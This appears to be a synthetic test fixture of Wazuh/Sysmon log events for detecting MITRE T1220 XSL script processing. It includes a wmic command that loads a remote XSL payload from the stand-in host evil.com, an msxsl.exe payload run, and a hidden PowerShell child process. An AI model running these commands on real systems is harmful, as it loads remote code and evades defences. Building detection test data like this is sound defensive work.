@@ -1,0 +1,227 @@
+{
+  "_metadata": {
+    "attack_id": "T1220",
+    "variation": "001",
+    "name": "XSL Script Processing",
+    "description": "Using XSL transforms to execute malicious code",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "defense-evasion",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - wmic with XSL",
+      "sequence": 1,
+      "timestamp": "2026-01-30T06:25:00.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: WMIC XSL Script Execution",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1220"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "XSL Script Processing"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000032.600001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 06:25:00.000",
+              "processGuid": "{XSL-001-0001-000000000001}",
+              "processId": "75000",
+              "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+              "commandLine": "wmic process list /format:\"http://evil.com/payload.xsl\"",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=WMIC_HASH_1234567890ABCDEF1234567890ABCDEF1234567",
+              "parentProcessGuid": "{XSL-001-0001-000000000000}",
+              "parentProcessId": "75000",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - msxsl.exe execution",
+      "sequence": 2,
+      "timestamp": "2026-01-30T06:25:05.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: MSXSL Execution",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1220"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "XSL Script Processing"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000032.600002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 06:25:05.000",
+              "processGuid": "{XSL-001-0001-000000000002}",
+              "processId": "75100",
+              "image": "C:\\Tools\\msxsl.exe",
+              "commandLine": "msxsl.exe data.xml payload.xsl",
+              "currentDirectory": "C:\\Tools\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=MSXSL_HASH_1234567890ABCDEF1234567890ABCDEF123456",
+              "parentProcessGuid": "{XSL-001-0001-000000000000}",
+              "parentProcessId": "75000",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Child process from XSL",
+      "sequence": 3,
+      "timestamp": "2026-01-30T06:25:10.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: XSL Script Spawned Process",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1220"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "XSL Script Processing"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000032.600003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 06:25:10.000",
+              "processGuid": "{XSL-001-0001-000000000003}",
+              "processId": "75200",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -nop -w hidden -c whoami",
+              "currentDirectory": "C:\\Tools\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=PS_HASH_1234567890ABCDEF1234567890ABCDEF1234567890",
+              "parentProcessGuid": "{XSL-001-0001-000000000001}",
+              "parentProcessId": "75000",
+              "parentImage": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+              "parentCommandLine": "wmic process list /format:\"http://evil.com/payload.xsl\""
+            }
+          }
+        }
+      }
+    }
+  ]
+}
